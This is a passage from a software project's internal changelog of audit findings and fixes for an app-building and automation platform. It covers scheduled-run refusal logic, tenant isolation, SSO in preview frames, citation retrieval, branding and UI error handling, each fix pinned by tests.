  portfolio de-verticalization.
- **`featured-icon-field-dead`** (low, dead code/content). All 42 featured-artifact manifests omit
  `icon` (the seeder's internal `FeaturedArtifactManifest` type declares it optional). The field is
  unused end-to-end, not 42 individual oversights: `shared/src/artifacts.ts`'s wire `Artifact` schema
  carries no `icon` field at all, and no web component under `web/components/artifacts/` or
  `chat-stripes.tsx` reads `.icon`. Someone should either wire it into the gallery card or delete it
  from the manifest interface - leaving it declared-but-ignored misleads whoever authors the next
  featured artifact.
- **`featured-seed-data-json-dead`** (low, dead code/stale comment). Eight non-`legal-*` featured
  artifacts ship a root-level `seed-data.json` alongside their scaffold
  (`api/assets/featured-artifacts/{ai-assistant,booking-system,cobrancas,ecommerce-catalog,
  help-desk,invoice-manager,sales-crm,task-manager}/seed-data.json`) that NO code path reads
  anywhere in `api/src` (grepped for the literal filename and for `seedData` - zero hits outside the
  asset directories themselves). `api/src/apps/artifact-bundle.ts`'s own header comment claims
  "featured seed-data is not carried into the bundle (seed lives in the featured catalog and is
  applied by fork)" - that comment is simply false today: there is no fork-time (or any other) code
  path that reads a featured artifact's `seed-data.json` and applies it to a new instance's
  `/api/app-data/*` rows. A stale comment asserting a mechanism that does not exist is worse than no
  comment, since the next reader will trust it. Not fixing the underlying gap here (all eight lack
  any install mechanism at all - no scaffold wires a button to consume this file the way
  `legal-nucleo`'s does for the shared spine - and four of the eight are DEMOTE candidates in
  `docs/featured-artifacts-ledger.md` anyway: `ecommerce-catalog`, `invoice-manager`, `sales-crm`,
  `task-manager`); recording it accurately is the whole ask.
- **`featured-gallery-data-hygiene`** (low, data). Two data-hygiene gaps in
  `api/assets/featured-artifacts/*/manifest.json`'s `featuredRank` (`shared/src/artifacts.ts`
  `featuredRank: z.number().int().optional()`): (1) `legal-agenda-reservas` has no `featuredRank` at
  all - schema-valid but likely an oversight, since every other artifact has one; (2) `sales-crm`
  (rank 10) and `task-manager` (rank 20) still outrank every `legal-*` artifact even though this
  audit demotes both as redundant with `legal-nucleo`/`legal-kanban` - a leftover from before the
  platform's legal specialization. Also two screenshots show a genuinely broken render rather than
  just empty data: `booking-system.png` (blank content pane, sidebar renders fine) and
  `sales-crm.png` ("Página não encontrada" 404 instead of the dashboard) - `booking-system` is
  disposed KEEP+UPGRADE and its screenshot bug should be root-caused before Stage C investment;
  `sales-crm` is disposed DEMOTE so its bug is lower priority but still real.

## Recently fixed - 2026-08-19 neutrality stops being the fall-through (round seven)

Rounds three to six each closed one refusal that was NEUTRAL against the failure ceiling for a
condition no waiting could change. Round seven stops treating them as three incidents and closes the
CLASS: neutrality is now a declared property of a named clearing act, refusals can only be built in
one module, and the census that keeps them honest covers every construction site rather than one
exported function. Each behaviour change is pinned by a test verified to fail against the unfixed
source.

- `posture-drift-refusal-is-neutral-but-repeats-identically` (**MAJOR**, the third sighting, found
  and fixed this round). Fixture: `[integration(posture permissive, baseUrl https://portal.example.com),
  wait, wait]`, no daemon. Permissive means locality answers `in-process` and the hosted Chromium
  opens; the act in step 1 leaves the declared origin (a click, an OAuth hop, a 302), so the
  post-action observation reports `https://bank.example.pt/...`. `resolveLocalityForStep` then built
  `{ kind: 'blocked', clearedBy: 'start-a-machine' }` -> `awaiting_daemon` -> NEUTRAL. Two
  consecutive `runAutomation` calls on an identical fixture both returned `awaiting_daemon`: the
  cause is a property of the STEP LIST, so replaying reproduces the same halt at the same index, the
  schedule re-fires nightly forever, the ceiling counts nothing, and the remediation it printed named
  a machine. **`clearedBy: 'start-a-machine'` was also a false instruction**, though the code
  corrects the report that no laptop can clear it at all: a connected daemon WOULD sidestep the check
  by making the verdict `bridge` before it runs. That is an accident of the route rather than the
  remediation, and it is unavailable to the owner with no machine, which is every owner running
  hosted.
  **HOW IT ESCAPED THE CENSUS.** `tests/automation/locality.test.ts` walks the cross product of
  `resolveLocality`'s whole input space and asserts the exact set of refusals it emits. This refusal
  was built in `engine.ts`, so the census could not see it. A census of one function is not a census
  of the product.

- `route-switch-refusal-is-neutral-but-repeats-identically` (was OPEN, LOW; **FIXED**). Same class,
  recorded last round and deferred on the grounds that an honest terminal state "means a third
  `clearedBy` value with its own ceiling rule and its own badge copy - a contract decision that
  deserves its own slice". **The code won that argument**: `localityTerminalFailureRecord` already
  existed, is already terminal on the schedule rail, and needs no new run status, no new badge copy
  and no new ceiling rule. The deferral was costing more than the fix.

**THE CLASS FIX**, in four parts that had to move together:

  (a) `clearedBy` gains `edit-the-automation`, for a cause that is a property of the step list. The
  engine maps it to the plain non-recoverable failure - terminal, drives the ceiling, auto-pauses
  loudly - and never to a ceremony ask, because re-establishing a session does not stop an
  automation navigating off its declared origin.

  (b) NEUTRALITY IS DECLARED, NOT DEFAULTED. `refusalRecordFor` asked `clearedBy === 'pair-a-machine'`
  and carried everything else as the neutral halt, so a refusal that failed to be the one terminal
  case inherited "retry forever" by saying nothing - which is how all three defects arrived.
  `CLEARING_ACTS` is now a `Record<ClearingAct, { neutral, because }>`: a new act does not compile
  until its neutrality is written beside the reason it is true, `refusalIsNeutral` is a table read,
  and the default for anything unconsidered is TERMINAL.

  (c) EVERY REFUSAL IS BUILT IN `locality.ts`. The blocked member carries a module-private `unique
  symbol` brand, so no other module can construct one - verified by the two test literals that
  stopped compiling. The drift and route-switch decisions moved in with it as
  `narrowLocalityForRun`, a pure function over the run's live facts (the URL the hosted browser is
  on, the origin the step declared, the route its context is already open for); `engine.ts` gathers,
  `locality.ts` judges.

  (d) THE CENSUS COVERS BOTH ENTRY POINTS. It crosses every verdict from `resolveLocality` with
  every state `narrowLocalityForRun` can be handed, asserts the exact set of refusals emitted, that
  each answers one way, that the terminal set is exactly the three whose cause is not environmental,
  and that every act in `CLEARING_ACTS` is reachable and every act reached is in `CLEARING_ACTS`.

  MUTATIONS, all verified red: see the round-seven mutation table in the commit message.

- `a-scheduled-automation-waiting-for-an-APPROVAL-reported-Failed` (MEDIUM, user-visible, FIXED).
  `BLOCKED_RUN_STATUSES` (`automation/service.ts`) held `awaiting_daemon` and `needs_credentials`
  but not `awaiting_consent`, so a scheduled AUTOMATION halting for an integration write approval
  came back `outcome: 'failed'` and the owner's badge read "Failed" for a run sitting waiting on
  their approval. The OTHER schedule target kind already answered `blocked` for the identical halt
  (`mapIntegrationOutcome`), the schedules surface already carried `runBlocked.awaiting_consent`
  copy for it, and `supervisor.ts`'s own docblock already named `awaiting_consent` beside
  `needs_credentials` as a block on a human act - so the two rails disagreed about one halt.
  **Correcting the report that raised this**: the copy is NOT dead, which is why the alternative
  disposition ("drop it") was wrong - it is reached today through the integration-action rail. FIXED
  by including the status. The ceiling is unaffected: `awaiting_consent` is deliberately NOT in
  `NEUTRAL_BLOCKED_CODES`, so it still counts and still auto-pauses.

- `getBrowser-guarded-on-a-condition-that-could-not-occur` (dead surface, removed). `if (connection
  && stepLocality?.kind !== 'in-process')` - `resolveLocality` answers `bridge` or `blocked` whenever
  `daemonConnected` is true, and `daemonConnected` IS `!!connection`, so a truthy `connection` and an
  `in-process` verdict cannot co-occur and the conjunct was never enterable. The docblock directly
  above it argues against exactly this ("an unpinnable guard reads as protection while providing
  none"). Removed; provably equivalent, so no test changes.

- `hostedTypistPermitForPortal-documented-a-branch-its-caller-cannot-reach` (docblock defect, fixed).
  `classifyOrigin(baseUrl)` is called with NO action, and `classifyOrigin` returns the frozen CLOSED
  classification before it looks at the url whenever `!action` - so `cloudEgressAllowed` is false for
  every input and the `{ hostedTypist: {} }` branch is unreachable from this caller. The docblock
  claimed the permit "becomes an ordinary YES the moment the sync is promoted onto a declared
  integration action", which is false as written: declaring an action changes nothing while the call
  site passes none. Corrected to say what it is (a constant NO), what would actually change it
  (passing the action here), and why the call stays rather than collapsing to a literal (posture is
  `origin-posture.ts`'s question; a literal is this rail deciding its own posture again, rule 3). The
  contract test asserting the permit is absent is now annotated as asserting a CONSTANT, with what it
  does pin - the wiring - said out loud.

## Recently fixed - 2026-08-19 an empty fleet was ignorance, so a solo tenant retried forever (round six)

Round five made the P4.2 slice reachable. Round six closes the regression that reachability exposed,
plus four pieces of surface that were reachable only from a test. Each behaviour change is pinned by
a test verified to fail against the unfixed source.

- `an-org-whose-only-machine-is-revoked-retried-forever` (**MAJOR**, a regression this branch
  introduced and did not ship). A solo tenant pairs ONE laptop, holds an attended ceremony on it,
  then revokes the pairing without replacing it. `egressCandidatesForOrg` filters `revokedAt: null`,
  so the org's fleet listing is genuinely `[]` - and `[]` was read as "this process does not know
  what this org has". `machineRetired` therefore answered NO, so NEITHER retirement branch fired
  (`credentialGateRecord`'s, and `resolveLocality`'s); with no daemon connected the run halted
  `awaiting_daemon`, which THIS BRANCH newly made NEUTRAL against the failure ceiling
  (`NEUTRAL_BLOCKED_CODES`); and the schedule re-fired nightly, forever, uncounted, telling the owner
  to connect a machine that no longer existed.
  On `main` the same case mapped to `failed` and auto-paused after 20 fires with `autoPausedAt` shown
  in the UI. The branch converted a BOUNDED dead end into an UNBOUNDED one - the exact pathology its
  own retirement fix was written to remove, re-created for the tenant least equipped to notice.
  ALSO WORTH RECORDING: the reviewer's suggested mechanism alone would not have fixed it. Making
  `machineRetired` answer YES for `[]` repairs `credentialGateRecord`'s branch, but that branch is
  never reached in this scenario - with no daemon connected `resolveLocality` refuses BEFORE the
  credential gate runs (`localityRecord ? {} : await credentialGateRecord(...)`), so the fix had to
  reach `resolveLocality` too. The code won that argument.
  FIXED, in three places that had to move together:
  (a) `EgressCandidateResolver` (`automation/seams.ts`) now answers `EgressCandidate[] | null`, and
  the UNBOUND default is `null`. `null` = no listing, `[]` = the registry says this org has no
  machines. A store error still THROWS rather than answering `null`, because a throw is a terminal
  run failure and therefore bounded, where `null` would restore the unbounded neutral wait.
  (b) `machineRetired` takes `readonly string[] | null`: `null` answers NO (not-knowing may never
  escalate), `[]` answers YES (every pairing is gone from a fleet with nothing in it).
  (c) `resolveLocality` gains the branch that matches the case: with no daemon connected and a
  KNOWN-EMPTY listing, a refusal that would have said "start your machine" says
  `NO_MACHINE_IN_ACCOUNT_REASON` instead and answers `clearedBy: 'pair-a-machine'`, which is
  terminal. The engine turns that into the ceremony halt when the step DECLARES a credential (the
  solo-tenant case: pair a machine, then establish the session) and into a plain non-recoverable
  failure when it does not - a credential ask for a step that wants none is a wrong specific
  instruction, which is worse than an honest general one.
  `clearedBy` was renamed from `'machine' | 'human'` to `'start-a-machine' | 'pair-a-machine'`,
  because its one consumer has to pick a halt with it and "a person must do something" was never
  enough to pick one.
  MUTATIONS, all verified red: `null`->`[]` on the unbound default, `[]`->NO on `machineRetired`,
  and deleting the `resolveLocality` branch.

- `resolveLocality-carried-a-retirement-branch-nothing-could-reach` (dead surface, removed). Round
  three's `preferenceMachineRetired` was unreachable in production and its own suite was the only
  caller. A preference is LEARNED only from a checkout that SUCCEEDED, and `bridge/attended.ts` -
  the single writer of `establishedBy: { kind: 'machine' }` - always stamps
  `boundEgress: { kind: 'residential', pairingId }` from the same id, so a successful checkout proves
  the machine is in the fleet listing and `machineRetired` cannot be true of it. Round five had
  already moved the live refusal one step earlier, into `credentialGateRecord`. REMOVED, together
  with the case that pinned it; `SESSION_MACHINE_RETIRED_REASON` moved to `egress-policy.ts`, beside
  the predicate whose `true` produces it and next to its one remaining caller.

- `establishedByPairingId-on-a-fresh-capture-was-unreachable` (dead surface + a dishonest fixture).
  `EnsureSessionResult.reestablished` carried the field, read off `EnsureSessionInput.vantage`. That
  input has NO production supplier - the default is cloud/datacenter - and it cannot get one while
  the typist is hosted: `establishWithTypist` logs in through `getLocalBrowserContext`, i.e. this
  process's Chromium, which is on no machine. The test asserting it hand-built the vantage, so it
  proved the branch compiled and nothing else - the same fixture-honesty failure round five closed
  twice over. REMOVED from the result type and the return; the case now drives the REAL typist and
  asserts the honest negative. `credential-gate.ts` reads the pairing from `reused` only.

- `schedule_blocked-was-emitted-into-a-channel-with-no-listener` (dead signal). The supervisor
  notifies the owner on every blocked fire, and it exists precisely because the ENVIRONMENT block is
  neutral against the ceiling: it never auto-pauses and announces itself no other way. Nothing in
  `web/` subscribed - no `notifications.on('schedule_blocked', ...)` anywhere - so the compensating
  signal reached nobody. FIXED: the schedules list page subscribes, toasts the CAUSE's words (derived
  from the code, never server prose, falling back to the general blocked label), and refetches so the
  row's badge stops showing the previous outcome. Pinned in
  `web/__tests__/components/schedules-page.test.tsx` on rendered text, not on a subscription
  existing.

- `resolveEgress-tenancy-filter-degraded-to-pairing-id-membership` (Rule 5). Extracting
  `residentialEgressPairings` left `resolveEgress` narrowing its ROWS by a set of pairing IDS:
  `candidates.filter((c) => available.has(c.pairingId) && ...)`. That is only as strong as the
  assumption that a pairing id identifies at most one row, and a tenancy boundary must not rest on an
  id being unique across tenants - `registerPairing` is reachable by two orgs and nothing enforces
  global uniqueness. A foreign row sharing one of our ids, listed first, becomes `usable[0]` and its
  tailnet address becomes the run's proxy: one tenant's portal traffic leaving through another
  tenant's house. FIXED: `c.org === actorOrg` restored on the row filter. Pinned in
  `api/tests/security/locality-isolation.test.ts` with a deliberately colliding id.

- `citius-sync-hard-coded-an-open-hosted-typist-permit` (Rule 3). The rail wrote
  `hostedTypist: {}` into its `ensureSession` call unconditionally, making it the one consumer in the
  repo able to type a lawyer's court password into the hosted Chromium, from a datacenter IP, for an
  origin nobody had classified. FIXED: the permit is an INPUT (`CitiusSyncInput.hostedTypist`,
  absent-means-no) composed at the rail's composition point (`routes/sync.ts`) from `classifyOrigin`,
  exactly as the run loop composes it. The sync drives a hard-coded portal walk rather than a declared
  `IntegrationAction`, so nothing declares it permissive and the answer today is a permit WITHHELD -
  the typist route becomes `needs-human` and a person establishes the session on a machine of their
  own, which is the correct closed reading for a court portal. It becomes an ordinary yes the moment
  the sync is promoted onto a declared action. Pinned on the input the rail actually received
  (`api/tests/contract/citius-sync.test.ts`).

## Recently fixed - 2026-08-19 P4.2 was dead code in production (round five)

Round four's verifier found that the ENTIRE P4.2 ceremony-preference path was unreachable in the
shipped product, and that the reason it was invisible was the fixtures. Both halves are closed here,
each pinned by a test verified to fail against the unfixed source.

- `run-loop-never-supplied-residentialAvailable` (**MAJOR**). The engine called
  `credentialGateRecord({actor, runId, automationName, steps, index, hostedBrowser})` and never
  passed `residentialAvailable`, so `evaluateCredentialGate` forwarded nothing, `ensureSession`
  handed `checkoutSession` an empty list, and checkout refused **every attended session there is**
  with `egress-unavailable`. `bridge/attended.ts` is the only production writer of
  `establishedBy: { kind: 'machine' }` and it always stamps `boundEgress: { kind: 'residential',
  pairingId }` beside it, so the refusal was universal for card-established sessions.
  TWO CONSEQUENCES, both real: (a) an attended card-login session could NEVER be reused by an
  automation, and the halt was `awaiting_daemon`, which is in `NEUTRAL_BLOCKED_CODES` - so the
  schedule re-fired forever, uncounted, with nothing the owner could do; the same unbounded-retry
  pathology this branch's retirement fix exists to remove, arriving by another route. (b)
  `verdict.status === 'reused'` was never reached for a machine-established session, so
  `establishedByPairingId` -> `preferredPairing` was never emitted and no P4.2 code ever ran.
  FIXED: the run loop already loads the org fleet into `egressCandidates`; it now derives the list
  through `residentialEgressPairings` (`automation/egress-policy.ts`), the SAME predicate
  `resolveEgress` uses - so "this machine can carry the work" and "this machine's session may be
  released" cannot drift apart. Tenancy pinned in `api/tests/security/locality-isolation.test.ts`
  (a foreign pairing in that list would let one tenant unwrap a session bound to another's house).
  MUTATION: dropping the argument reddens 10 cases in `engine-locality.test.ts`.

- `every-P4.2-fixture-stamped-a-session-production-cannot-emit` (**MAJOR**, and the reason the above
  was invisible). All four engine fixtures and the unit fixture paired
  `establishedBy: { kind: 'machine' }` with `boundEgress: { kind: 'datacenter' }`, under a comment
  saying that kept checkout out of the way. No code path in this repo produces machine+datacenter:
  the hosted typist writes `cloud`+`datacenter`, the ceremony writes `machine`+`residential`, and
  `EstablishmentVantage` (the only other way to reach the field) has NO production producer at all.
  The suite therefore exercised a variant the product cannot emit while the one it does emit halted
  at the gate. FIXED: every fixture now carries the shape `attended.ts` writes.

- `the-retirement-branch-was-unreachable-for-the-same-reason` (found while repairing the fixtures,
  deeper than the report that prompted it). Because a ceremony session is bound to its machine's
  residential line, REVOKING that machine makes checkout refuse the session outright - so the run
  never learns the ceremony pairing, and `resolveLocality`'s retirement branch (round three's fix
  for exactly this dead end) could not fire in production either. The unbounded retry it was written
  to remove was still there, one step earlier.
  FIXED: `credentialGateRecord` now asks the fleet listing whether the machine checkout named is
  GONE or merely asleep, through the same `machineRetired` predicate `preferenceMachineRetired`
  uses, and produces the identical `needs_credentials` ceremony halt via the shared
  `SESSION_MACHINE_RETIRED_REASON`. An EMPTY listing still reads as NOT retired - the closed
  direction, so an unbound seam can never escalate a neutral wait into a terminal halt.
  The gate carries `origin` and `requiredPairingId` as FACTS rather than folded into prose, because
  the fleet listing lives in the engine and not in the gate.
  MUTATION: disabling the branch reddens 4 cases.

- `two unpinned engine guards` - both mutable to no effect before this round.
  `localityRecord ? {} : await credentialGateRecord(...)`: removing the guard left every suite green
  because the refusal record still wins the `??` chain, so status, halt and message are identical
  either way. What changes is what the gate DOES on the way to an answer nobody asked for - it
  decrypts the credential for a step that will never run and, on a route-switch refusal, opens the
  hosted browser and types the password out of a door no work in the run is using. Pinned by
  "a step locality already refused never reaches the credential gate, so no second door opens",
  whose observable is a SECOND browser context (mutation: 1 -> 2).
  `stepLocality = null`: deleting it let a non-browser step inherit the previous BROWSER step's
  verdict and compute its typist permit from a decision about a different origin. Pinned by "a step
  with no locality of its own does not inherit the last browser step's door" (mutation: the login
  for portal B leaves through `pair_home`, the machine resolved for portal A's step).

## Recently fixed - 2026-08-18 schedules adversarial review (15 confirmed, all closed by test)

The schedules feature (5a5e721) was merged to `main` under the review gate the QA process requires.
A four-lens adversarial review (tenancy/auth, supervisor correctness, wire contract, web surface)
raised 23 findings; each was handed to an independent verifier prompted to REFUTE it. **8 were
refuted** (recorded below as dismissals), **15 were confirmed** and are all now fixed, every one
pinned by a test verified to fail before the fix and pass after.

**Supervisor (`api/src/schedules/supervisor.ts`).**
- `schedules-slow-fire-starves-due-tail` - the tick blocked at the concurrency gate
  (`while (inFlight.size >= max) await Promise.race(...)`), so a few slow fires stalled the due
  list until its tail aged past the 5-minute grace and was skipped outright. The blocking wait is
  gone: a schedule that finds no free slot is deferred to the next tick, and the staleness verdict
  is now judged against `firstSeenDue(scheduleId, plannedFor)` - the instant this process first saw
  the occurrence due - so the supervisor's own queueing can never convert a live occurrence into a
  skipped one.
- `schedules-stale-recovery-crawls` - stale recovery advanced the pointer by ONE occurrence per
  tick, so a 5-minute schedule stayed silent for hours after a short outage while it walked
  forward. `advance()` now takes `adoptFromMs` on the stale path and lands on the first occurrence
  at or after now in one step.
- `schedules-missed-once-vanishes` - a `once` schedule whose instant passed while the process was
  down hit the stale branch and was dropped with no run row and no user-visible trace. It now goes
  through `recordMissedOccurrence()` under the SAME deterministic `occurrenceRunId` claim (so
  at-most-once still holds across processes), writing a terminal row with `detail.code: 'missed'`
  and no `firedAt`. No `shared/` change: the existing `failed` status plus a code is exactly the
  designed vocabulary ("user-facing text derives from the CODE, never from server prose").
- `schedules-fire-escapes-shutdown` - `stop()` spread `inFlight` ONCE, so a fire launched by an
  in-flight tick after that snapshot escaped, leaving a claimed occurrence stuck `running` forever
  (the deterministic claim makes it permanent). `ticking` is now the pass promise, `stop()` drains
  in a loop, and `claimAndFire` re-checks the generation immediately before the claim insert.

**Wire contract.**
- `schedules-runs-status-filter-dropped` - `GET /api/v1/schedules/:id/runs` DECLARED a `status`
  query filter and silently forwarded only `limit`, so a client filtering by status got unfiltered
  rows and could not tell. Honoured end to end now (route -> service -> store), with the limit
  capping the filtered set.
- `schedules-preview-has-no-anchor` - `SchedulePreviewRequest` was `{spec, count}`, so
  `previewSpec` always anchored on the REQUEST INSTANT while the supervisor anchors on the
  schedule's `createdAt`. The edit dialog therefore previewed occurrence times the supervisor would
  not fire. Additive fix: optional `scheduleId`, anchor read from the STORE (never from the body -
  a caller-chosen anchor would be a second source of occurrence truth), landed with its contract
  test, OpenAPI regen and client regen in the same unit.

**Rule 5 regression-guard gap.**
- `schedules-list-owner-filter-untested` - the isolation suite's header claimed "list surfaces
  never leak" and that coverage did not exist. Every peer probe hit item-level routes guarded by
  `canSeeSchedule`/`getSchedule`; nothing exercised the owner narrowing in `listSchedules`
  (`store.ts:80`) or `listRunsForActor` (`store.ts:189`). **Proof it mattered:** deleting both lines
  left the whole suite green while every plain user in an org gained read access to every
  colleague's schedules and runs, including `target.instructions` free text. The shipped code was
  always correct - this was a missing guard, not a live hole. Closed by a test that asserts
  "mine, and only mine" on both collection surfaces with the victim's specific ids, verified to
  fail with either narrowing line removed independently.

**Web surface - the UI lying when something fails.** All five error-handling defects shared one
root cause: the store had a single `error` field that no page read. Split into `loadError` (a
broken READ) and `error` (a refused ACTION).
- A failed list fetch rendered the "no schedules yet" EMPTY state - telling the user their data
  does not exist. Now an error card with retry; the empty state is gated on the list having
  actually arrived.
- Every mutation failure was silent (toggle snapped back, delete/run-now/complete failed
  invisibly). Now reported through the same toast channel `integrations/page.tsx` uses.
- The detail page reported "schedule not found" for a 500, a 403 and a network loss alike. Now only
  a 404 reads as absent.
- Run history spun forever when its fetch failed (`runs === undefined` assumed only two states).
- Org-admins see the whole org's schedules (deliberate) but may only mutate their own, so every
  mutating control shown on a peer's row was guaranteed to 404. New `web/lib/schedules/authority.ts`
  `canActOnOwned` mirrors the server's `canEditSchedule`; rows stay readable without fake controls.
- Rows were mouse-only (a `Card` div with `onClick`): now a real link with a stretched overlay, so
  keyboard and AT reach it as a link. Form validation errors moved out of the scrolling body into
  the fixed footer beside the submit button, where they are visible at the moment of submission.

**Dismissed (verifier refuted, no change made).** Run failure codes rendered untranslated (the
code-not-prose rule is deliberate and pinned by the `run-error-text-leak` fix above); em dashes in
the e2e spec (comments only, not authored user-facing content); `every:'week'` above ~157 answering
null (schema allows 999, but the search horizon is a deliberate bound and the refusal is explicit,
not silent); the CAS mutator writing on an authorization refusal (no cross-tenant effect - the
mutator returns `cur` unchanged and the write is a no-op rewrite); preview timezone presentation;
the e2e preview assertion's looseness; and run-now touching `consecutiveFailures` (a docstring
wording nit - the ceiling state it produces is intended).

## Recently fixed - 2026-08-15 a cancelled framed sign-in left the app hung (own regression)

**`framed-sso-never-settles`** (found by driving the REAL customer ERP login framed with the
first version of the popup fix below; a regression that fix introduced). Removing the frame
navigation removed the only signal an app had that sign-in had ended. Measured: click
"Continuar com Microsoft 365", close the popup, and the button stays `disabled` with its
spinner animating **forever** - the ERP does `setMsLoading(true)` on click and nothing clears
it, which was invisible while the frame navigated away. Every already-built bundle has the
same shape, so no app-side change reaches them. **Fixed** in the runtime (decision entry
2026-08-15): `signIn()` returns `Promise<boolean>` and both outcomes dispatch a cancelable
`ekoa:sso-complete` / `ekoa:sso-cancelled` event, then reload the frame unless a listener
calls `preventDefault()`; a still-open popup past the watcher budget stops without reloading.
Side benefit, verified in the same pass: the reload revived the ERP's own `erp_sso_pending`
path, so a cancelled/failed SSO now renders its intended PT-PT message instead of nothing.
Closed by: `api/tests/contract/served-app.test.ts` (settle strings) + a third test in
`web/e2e/app-sso-frame.spec.ts` - green against the fixed runtime, failing against the old
one. Still OPEN and app-side, recorded here rather than silently fixed: submitting the ERP
login with BOTH fields empty fires a doomed `POST /api/app-sso/login` (400) and reports
"E-mail ou palavra-passe incorretos." instead of asking the user to fill the fields; that is
a change to the customer's artifact source, not to this repo.

## Recently fixed - 2026-08-15 preview frame rendered "refused to connect" on Microsoft sign-in

**`preview-frame-sso-refused`** (found live by the owner on the tailnet dev stack: the builder
side-panel's Pré-visualização of the imported salomao ERP showed "dev-madrid.tail31efa.ts.net
refused to connect"; ask recorded as "we should allow new windows and pop ups on the preview
frame"). Root cause reproduced E2E before touching code: the ERP's "Continuar com Microsoft 365"
calls the injected `__ekoa.signIn()`, which `location.assign`ed the IFRAME to
`/api/app-sso/microsoft/start` - an /api-surface URL served with `X-Frame-Options: DENY` +
`frame-ancestors 'none'` (security-headers.ts, correct and unchanged), and the provider's own
login page refuses framing too. So in-frame SSO can never render; the panel showed Chrome's
refusal instead. NOT a frame-ancestors misconfiguration: `/apps/*` framed fine throughout (the
2026-08-07 tailnet CSP finding stayed fixed). **Fixed** by making the injected runtime
frame-aware (decision entry 2026-08-15): framed `signIn()` opens the start URL in a named
top-level window (`'__ekoa_sso_'+appId`) and polls the quiet `/api/app-sso/session` probe
against a popup-open baseline, reloading the frame only on a session CHANGE; the popup, when
the callback returns it to `/apps/<id>/<return>`, detects the marker name + same-origin framed
opener, reloads that frame and closes itself; a BLOCKED popup leaves the frame alone with a
console warning; top-level keeps the unchanged `location.assign`. Closed by:
`api/tests/contract/served-app.test.ts` (frame-aware signIn strings) +
`web/e2e/app-sso-frame.spec.ts` (ledgered same change; verified green against a scratch --built
stack AND verified to fail against the pre-change runtime). Residual, deliberate: the LIVE dev
stack keeps serving the old dist until its next restart - restarting it here would have wiped
the ephemeral Mongo holding the verified salomao import; and dev answers the start leg 503
(Microsoft SSO env not configured), which now renders in the popup instead of killing the frame.

## Recently fixed - 2026-08-13 "Usar" opened an unshared artifact's dead 410 link

**`usar-opens-revoked-link`** (found during the live verification of the assistant-overhaul batch:
the artifacts page's primary "Usar" action on a freshly built app opened
`/apps/<slug>/` bare, which answers 410 "Link já não disponível - O autor revogou a partilha").
`getArtifactAppUrl` (web/components/artifacts/artifacts-surface.tsx) never attached the owner
preview token, so the dashboard's own primary action was dead for every artifact the owner had
not explicitly shared - which is every fresh build. **Fixed**: an unshared artifact routes
through `api.withPreviewToken` (Q-05: owner-checked, non-shareable previews only); a SHAREABLE
artifact keeps the bare link, because a copied share URL must never carry the owner's JWT.
Closed by: `web/__tests__/lib/artifact-app-url.test.ts` (ledgered same change). Also fixed in
passing, both pre-existing red on clean `main`: `tests/automation/engine.test.ts` pinned the
English word "approval" on a terminal frame that now carries PT-PT product copy (the pin moved to
the PT copy; the internal-record assertion already covered the English form), and
`docs/CONVERGENCE_AUDIT.md` cited `garrison:compositions/dogfood-orch/apm.yml`, which no longer
exists (the composition ships no apm.yml; the sentence now states current reality and the citation
gate is green).

## Recently fixed - 2026-08-13 assistant citations were retrieval hits, not citations

**`assistant-citations-not-citations`** (found live by the owner: a plain todo-list app's
"Dê-me uma visão geral da aplicação" answered with 5 "Fontes" under the label "jurisprudencia",
none of them used by the answer). Three stacked defects: (1) `app-assistant.ts` mapped EVERY
retrieval hit to a citation BEFORE the model ran and returned them unconditionally; (2) retrieval
always searched the `_shared` legal corpus (198k docs here) with no relevance threshold and a
1.25x authority boost for legal collections; (3) `toMatchQuery` checked stopwords BEFORE accent
folding, so "dê" sailed past the list and the index's `remove_diacritics 2` tokenizer matched it
against every "de" in the corpus - virtually the whole corpus matched and BM25 picked 5.
**Fixed** by three layers: fold-before-stopword (+ pronoun/filler stopwords), the shared corpus
joins grounding only on a legal-context query (org vault always searched;
`search(..., { includeShared })`), and citations are now USED-ONLY (numbered excerpts; the reply's
`[n]` references select which hits are cited; no reference = no Fontes). Closed by:
`tests/knowledge/index-store.test.ts`, `tests/knowledge/grounding.test.ts`,
`tests/apps/app-assistant.test.ts`. Decision entry: 2026-08-13 batch, items 1-2.

## Recently fixed - 2026-08-13 the brand chain to built apps was dead end-to-end

**`brand-chain-dead-end-to-end`** (found while investigating "the app looks generic and has no
logo" - the org had a COMPLETE researched brand two minutes before the build). Four breaks, each
alone fatal: (1) the served app document linked `/api/design-tokens.css` bare, and the api stamps
`Referrer-Policy: no-referrer` on every response, so `appIdFromRequest` could never resolve an org
in a REAL browser - every app always received the platform-default teal (live-verified by curl);
(2) even resolved, the logo token emitted `url("/brand-assets//brand-assets/x.png")` (double
prefix, 404); (3) researched `fonts[]` were never mapped to the font tokens, and nothing populates
`logoIcon` - the FIRST token the app shell checks; (4) the first-build prompt carried zero brand,
and the house style defaults to a light background, so a dark-brand org got a light generic app by
construction. **Fixed**: `?app={{APP_ID}}` on the tokens link (+ injection into agent-authored
plain-HTML heads), `Referrer-Policy: same-origin` on the /apps DOCUMENT surface only, the
already-rooted asset path taken as-is, fonts[] mapped, `--logo-icon-url` falls back to the logo,
the neutral layer derives from the org's extracted canvas (WCAG-derived hover/on-primary; dark
brand = dark app), and `prepareFirstBuild` appends a compact org-brand prompt section
(`apps/brand-prompt.ts`). Closed by: `tests/legal/design-tokens.test.ts`,
`tests/apps/builder.test.ts`, `tests/apps/build-mechanics.test.ts`,
`tests/apps/brand-prompt.test.ts`, `tests/security-headers.test.ts`. Decision entry: 2026-08-13
batch, item 6. The gate-class lesson (a resolution path only exercisable with a hand-set header is
a green gate proving nothing) is why the new design-tokens test fetches exactly as a browser does.

## Recently fixed - 2026-08-13 an overload-killed first build was terminal and lost its tier

**`first-build-overload-terminal`** (the "20-minute todo app", measured from the dev Mongo: 4m20s
GENIUS attempt killed by API 529 after 4m10s of INVISIBLE Agent SDK internal retries + 8m13s of
human reaction time + a 6m55s successful manual retry that - because the failed build had already
created the artifact - routed as a FOLLOW-UP at EXPERT, silently dropping the GENIUS first-build
directive). ADAPTER_ERROR was "retryable" in name only: nothing in the pipeline retried. **Fixed**
by the in-job overload retry + first-event deadline (decision entry 2026-08-13 item 3). Closed by:
`tests/agents/build.test.ts` "overload resilience" (5 cases incl. the never-retry guards).

## Recently fixed - 2026-08-13 the guided tour highlighted content hidden behind the panel

**`panel-overlay-occludes-app`** (found live: Tutorial guiado step 5 pointed at the history list
while the fixed 380px panel covered it; the ring overlay also out-z-indexed the panel, greying the
tour's own Seguinte/Sair controls). The panel was a pure overlay - nothing reserved layout space -
and the C3 ring overlay knew nothing about it. **Fixed**: the open panel stamps
`<html data-ekoa-assistant-open>` and the injected CSS reserves a matching body margin on >900px
